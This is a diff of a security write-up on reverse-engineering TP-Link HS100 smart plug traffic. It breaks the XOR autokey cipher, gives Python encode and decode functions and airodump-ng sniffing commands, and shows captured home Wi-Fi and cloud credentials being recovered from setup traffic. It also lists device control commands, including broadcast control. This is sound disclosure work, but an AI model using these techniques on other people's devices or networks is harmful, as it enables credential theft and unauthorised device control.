@@ -16,19 +16,17 @@ A port scan of the device showed 9999 as the only open port.
 
 # Attempted Reverse Engineering of Kasa
 
-A copy of the latest Kasa APK was downloaded from   [APKMirror](https://www.apkmirror.com) and decompiled using [DEX2Jar](https://github.com/pxb1988/dex2jar). The resulting file was examined using [JD-GUI](https://github.com/java-decompiler/jd-gui) and [Luyten](https://github.com/deathmarine/Luyten). The goal was to isolate and analyze the section of the app that handled to device configuration in order to determine the method used for information encoding.
+A copy of the latest Kasa APK was downloaded from   [APKMirror](https://www.apkmirror.com) and decompiled using [DEX2Jar](https://github.com/pxb1988/dex2jar). The resulting file was examined using [JD-GUI](https://github.com/java-decompiler/jd-gui) and [Luyten](https://github.com/deathmarine/Luyten). The goal was to isolate and analyze the section of the app that handled to device configuration in order to determine the encryption method.
 
-Naturally, the decompiled Java code was void of the original variable and function names. After spending a few days looking through functions and variables whose names were one character letters I had made next to no progress isolating any encoding function. I switched my focus to the network protocol.
+Naturally, the decompiled Java code was void of any of the original variable and function names. After spending a few days looking through functions and variables whose names were one character letters I had made next to no progress making sense of the application. In the interest of time, I switched my focus to the network protocol.
 
 # Reverse Engineering the Network Protocol
 
-  
-  
+After capturing device setup traffic multiple times, I started to notice identical packets across different pcaps. This led me to try a known plaintext attack by varying the device alias passed during setup. The user is asked to pick a name for the plug, with a default value of "My Smart Plug". I captured another pcap of device setup traffic with the alias of "My Smart Slug" to test my hypothesis. 
 
 ## Known Plaintext Attack
 
- After capturing device setup traffic multiple times, I started to notice identical packets across different pcaps. This led me to try a known plaintext attack by varying the device alias passed during setup. The user is asked to pick a name for the plug, with a default value of "My Smart Plug". I captured another pcap of device setup traffic with the alias of "My Smart Slug" to test my hypothesis. After painstackingly analyzing the TCP payload of the two captures, I was able to identify two packets with identical length and very similar structure.
-
+ After painstackingly analyzing the TCP payload of the two captures, I was able to identify two packets with identical length and very similar structure. The differences between the two are highlighted in green and red below.
 
 "My Smart Plug" Capture
 
@@ -49,20 +47,32 @@ a0:d4:8b:ef:8a:fc:a3:c2:ae:c7:a6:d5:f7:cd:b6:94:f5:
 -e6:8a:ff:98:ba:c7:ba:c7
 ```
 
-One can clearly pinpoint the difference starts at e5 vs e6.
-Given the two strings differ in Plug vs Slug, I assumed e5 is likely 'P' and e6 is likely 'S'. In ASCII, 'P' is 0x50 and 'S' is 0x53. If we try an XOR of the plaintext and the ciphertext, we should be able to recover the byte used originally.
+One can clearly pinpoint the byte where the differences start: e5 vs e6.
+Given the two device strings differ only by one letter, I assumed e5 is likely 'P' and e6 is likely 'S'. In ASCII, 'P' is 0x50 and 'S' is 0x53.
 
-  
+If we XOR the plaintext and the ciphertext, we should recover one byte of the key used to encrypt the message originally.
+
+ 
 ```
 0xe5 XOR 0x50 = 0xb5
 0xe6 XOR 0x53 = 0xb5
 ```
   
- In both cases, the characters seem to be XOR'd with the ciphertext of the preceding byte. Continuing this process, we see the character before is a space (0xb5 XOR 0x95 = 0x20) and the character after is an 'l' ( 0x89 XOR 0xe5= 0x6c, as does 0x8a XOR 0xe6). Continuing this trend, we are able to decrypt the entire message except for the first few bytes, which decode to unprintable characters.
+In both cases, the key is the ciphertext of the preceding byte. If we continue this process for the adjacent bytes, we see the preceding character is a space, and the following character is a 'l'.
+```
+ 0xb5 XOR 0x95 = 0x20	ASCII for ' '
+ 0x89 XOR 0xe5 = 0x6c	ASCII for 'l'
+ 0x8a XOR 0xe6 = 0x6c
+```
+
+Considering the aliases were "My Smart Plug" and "My Smart Slug", this decryption scheme is likely valid. Applying this method to the rest of the message, we are able to decrypt the entire command except for the first few bytes which are unprintable.
+
 ```
 "system":{"set_dev_alias":{"alias":"My Smart Plug"}}}
 ```
-Given that the structure of the command appears to be JSON, we can assume there should be one more '{' at the beginning of the string. Through some trial and error, the beginning XOR key was found to be 0xab (171 in decimal).
+
+Given that the structure of the command appears to be JSON, I assumed there should be one more '{' at the beginning of the string. Through some trial and error, the initial key was found to be 0xab (171 in decimal).
+
 ```
 0xab XOR 0xd0 = 0x7c 	ASCII for '{'
 ```
@@ -70,7 +80,7 @@ I was not able to find what the first four bytes 00:00:00:36 were used for in th
 
 # Decoding network traffic
 
-With the algorithm figured out, I was able to write a quick python script to decode a TCP packet. In order to avoid any ambiguity about which beginning bytes to ignore, I chose to decode the string backwards due to my knowledge of the command format.
+With the decryption algorithm figured out, I was able to write a python script to decode the TCP packets. In order to avoid any ambiguity about mystery bytes at the beginning of the message, I decoded the string in reverse and added the beginning '{'.
 
 ```
 def  decode(pkt):
@@ -88,30 +98,34 @@ def  decode(pkt):
 ```
   
  
-Utilizing the Scapy module, I was able to parse an entire pcap file and decode all configuration messages sent over TCP or UDP.
+Utilizing the Scapy module, I was able to iterate through an entire packet capture and decode all of the smart plug's communication over TCP or UDP.
 
-# Sniffing Device Setup with Pi Zero
+# Capturing setup traffic with a Raspberry Pi Zero W
 
   ![Image of Sniffer](https://i.imgur.com/8R2PgRk.jpg=250x)
 
-Raspberri Pi Zero W running Kali with [Re4son’s Pi-Tail](https://whitedome.com.au/re4son/pi-tail/)
+### Parts
+Raspberri Pi Zero W running Kali via [Re4son’s Pi-Tail](https://whitedome.com.au/re4son/pi-tail/)
 Alfa AWUS036NH Wireless Adapter
 External Battery Pack
 
-Roughly 20s after receiving power, the setup begins sniffing for HS100 networks used for device setup with the following startup script:
+### Configuration
+Roughly 20s after receiving power, the Pi has booted and automatically logged in. Upon login, a bash script begins sniffing for HS100 networks used for device setup with the following startup script. This setup is capable of capturing continuous configuration traffic from multiple smart plugs, as long as the battery lasts.
+
 ```
 airmon-ng start wlan1
 airmon-ng check kill
 airodump-ng wlan1mon -c 1 --essid-regex Plug -w scan_results
 ```
+The provided ESSID capture filter matches all Wi-Fi networks with "Plug" in the ESSID. This will include all HS100 networks of the form TP-Link_Smart Plug_XXXX. While this filter could also capture extraneous networks, the regex filter can be furthered refined if necessary. 
 
-The provided ESSID capture filter will include all HS100 networks, however it could also capture extra packets depending on the surrounding networks. The regex filter can be furthered refined if necessary.
-
-This setup is capable of capturing multiple device setups, so long as the battery pack has power. I encountered some issues with my antenna with receiving every packet, however the capture worked extremely well when the sniffer was between the path between the plug and the phone. I imagine the problem would be non-existent with a better antenna.
+Interestingly, the plugs only created setup networks on Channel 1 during my testing. This could be a universal default, or Channel 1 could be the least congested in my area. Regardless, sniffing a single channel was essential to capturing all packets during setup. If a single channel was not used, airodump-ng missed packets while channel hopping.
 
 
-Below is my best decoded packet capture with this setup. 
-Note: some duplicate information from retransmitted packets was removed using uniq.
+I encountered some issues with my antenna missing some packets, however the capture worked extremely well when the sniffer was between the smart plug and the smartphone. This problem could be mitigated with a better antenna, although battery life would suffer.
+
+
+Below are the decoded commands from my best packet capture with this setup. Note: some duplicate information from retransmitted packets was removed using uniq.
 ```
 {"system":{"get_sysinfo":{}}}
 {"system":{"get_sysinfo":{"err_code":0,"sw_ver":"1.2.5 Build 171129 Rel.174814","hw_ver":"1.0","type":"IOT.SMARTPLUGSWITCH","model":"HS100(US)","mac":"50:C7:BF:5B:57:7E","deviceId":"8006CA44F6E7658EABC6D2CD45B6DB46186BDA47","hwId":"5EACBE93FB9E32ECBE1F1C2ADE6DDE11","fwId":"00000000000000000000000000000000","oemId":"37589AA1F5CACDC53E2914B7760127E5","alias":"TP-LINK_Smart Plug_577E","dev_name":"Wi-Fi Smart Plug","icon_hash":"","relay_state":1,"on_time":56,"active_mode":"none","feature":"TIM","updating":0,"led_off":0,"latitude":0,"longitude":0}}}
@@ -147,13 +161,13 @@ Note the following information:
 {"netif":{"set_stainfo":{"key_type":3,"password":"fireandblood","ssid":"Winternet is Coming"}}}
 ```
 
-The credentials to my TP-Link Cloud Account and my Wifi Network are easily recovered from the network capture. 
+The (temporary) credentials to my TP-Link Cloud Account and my Wi-Fi Network are easily recovered from capture. 
 
-# Enumerating commands
+# Enumerating HS100 commands
 
-  With the encryption algorithm known, I began capturing traffic related to functions available in the Kasa App. This process was painstaking because the plugs cannot be used on an open wifi network. I found this ironic, give that the device setup occurs over an open wifi network.
+ With the encryption algorithm known, I began capturing traffic related to functions available in the Kasa App. This process was painstaking because the plugs cannot be used on an open wifi network. I found this ironic, give that the device setup occurs over an open wifi network.
   
-Therefore I had to use Wireshark to decrypt the WPA2 traffic for my network and copy and paste the TCP payloads into my script for decoding. The following list is non-exhaustive.
+Therefore I had to use Wireshark to decrypt the WPA2 traffic for my network. As far as I know, there's no built in way to export this decrypted traffic, so I copy and pasted the TCP payloads into my script for decoding. The following list is non-exhaustive.
 
 Get System Info 
 ```
@@ -180,7 +194,7 @@ Turn off the plug's LED (Night mode)
 ```
 Rename the device
 ```
-{"system":{"set_dev_alias":{"alias":"New name here"}}}
+{"system":{"set_dev_alias":{"alias":"New alias here"}}}
 ```
 
 
@@ -191,27 +205,50 @@ Get Cloud Info (Server, Username, Connection Status)
 
 Connect with new cloud account
 ```
-{"cnCloud":{"bind":{"username":"some@email.com", "password":"yourpass"}}}
+{"cnCloud":{"bind":{"username":"email", "password":"pass"}}}
 ```
-Logout device from cloud
+Disconnect device from the cloud
 ```
 {"cnCloud":{"unbind":{}}}
 ```
 
-
-Add new timer (countdown)
-Delay is time in seconds
-Act is 1 to turn device on after delay, or 0 to turn off.
+Get current timer rule
+```
+{"count_down":{"get_rules":{}}}
+```
+Add a new timer, where delay is in seconds and act = 1 turns the device on, and act=0 turns the device off after timer expiration.
 ```
 {"count_down":{"add_rule":{"enable":1,"delay":60,"act":1,"name":"rule name"}}}
 ```
-# Controlling Plugs with Computer
+
+Delete all timers (the device can only store a single timer)
+```
+{"count_down":{"delete_all_rules":{}}}
+```
+# Controlling the smart plugs programmatically
+
+With the list of commands, and the encryption algorithm, it's possible to control the device outside of Kasa. This could be done maliciously after connecting to the victim's network with the leaked credentials, or it could be used to expand scripting functionality of the device for owners.
+
+The encryption function is similar to the decryption function
+```
+def encode(msg):
+	ret =  ""
+	for i in  range(len(msg)):
+		if i ==  0:
+			ret +=  chr(ord(msg[i]) ^  171)
+		else:
+			ret +=  chr(ord(msg[i]) ^  ord(ret[i-1]))
+	return ret
+```
+
+Commands can be sent over TCP or UDP. The benefit to sending over UDP is the broadcast address. It's possible to control all devices on the network using the broadcast address. If paired with the get_sysinfo command, this effectively enumerates all devices on the network.
+
 
 # Conclusion
 
 The device setup information is encrypted using an [autokey cipher](https://en.wikipedia.org/wiki/Autokey_cipher). This cipher was broken with a known plaintext attack, which allowed for all configuration information to be decoded.
   
- The credentials to a user's TP-Link Cloud Account and a user's home Wifi network are easily captured, and can be done with a portable Pi Zero W setup.
+Included in this configuration information are the user's network and TP-Link Cloud credentials. This information can be easily captured with a portable Pi Zero W setup.
 
 ## Authors
 
